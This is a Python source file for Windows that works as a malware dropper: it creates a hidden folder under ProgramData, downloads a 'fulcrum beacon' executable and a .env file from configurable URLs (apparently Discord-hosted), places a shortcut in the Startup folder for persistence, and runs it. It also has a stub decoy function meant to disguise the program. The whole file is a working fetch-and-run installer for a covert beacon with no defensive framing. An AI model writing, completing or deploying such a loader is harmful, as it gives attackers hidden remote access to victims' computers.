import os
from dotenv import load_dotenv
import requests
from win32com.client import Dispatch
import ctypes
import sys
import shutil


FLAG_PATH = "C:\\ProgramData\\FUC Cache"
INSTALL_PATH = "C:\\ProgramData\\FUC HUB"

DOT_ENV_FILE_URL = "YOUR URL"
BEACON_URL = "YOUR URL"

fulcrum_beacon_file_name = ""   # not used

START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')


def _download_file(url, path, name):
    os.makedirs(path, exist_ok=True)
    response = requests.get(url, allow_redirects=True)
    with open(os.path.join(path, name), 'wb') as f:
        for chunk in response.iter_content(chunk_size=8192):
            # Write each chunk to the file
            f.write(chunk)


def check_flags():
    if os.path.isdir(FLAG_PATH):
        return True
    return False


def create_shortcut(shortcut_path, target_path):
    # creating a windows shortcut
    try:
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = target_path
        shortcut.WorkingDirectory = os.path.dirname(target_path)
        shortcut.save()
    except:
        pass

def decoy_function():
    # add some code that acts as a decoy / maybe tic-tac-toe or sum
    print("hello world")


def main():
    if not check_flags():
        # get file name from beacon url(only works with discord url)
        question_mark_index = BEACON_URL.find("?")
        beacon_filename = BEACON_URL[:question_mark_index]
        last_slash_index = beacon_filename.rfind("/")
        beacon_filename = beacon_filename[last_slash_index + 1:]

        # create new hidden path
        os.mkdir(INSTALL_PATH)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_PATH, FILE_ATTRIBUTE_HIDDEN)

        # download fulcrum beacon file
        _download_file(BEACON_URL, INSTALL_PATH, beacon_filename)
        # download .env file
        _download_file(DOT_ENV_FILE_URL, INSTALL_PATH, ".env")
        # add the file to startup using a shortcut in the startup folder
        create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
                        os.path.join(INSTALL_PATH, beacon_filename))

        # execute shortcut
        os.startfile(os.path.join(START_FOLDER, "START_MENU.lnk"))



if __name__ == '__main__':
    main()              # installer
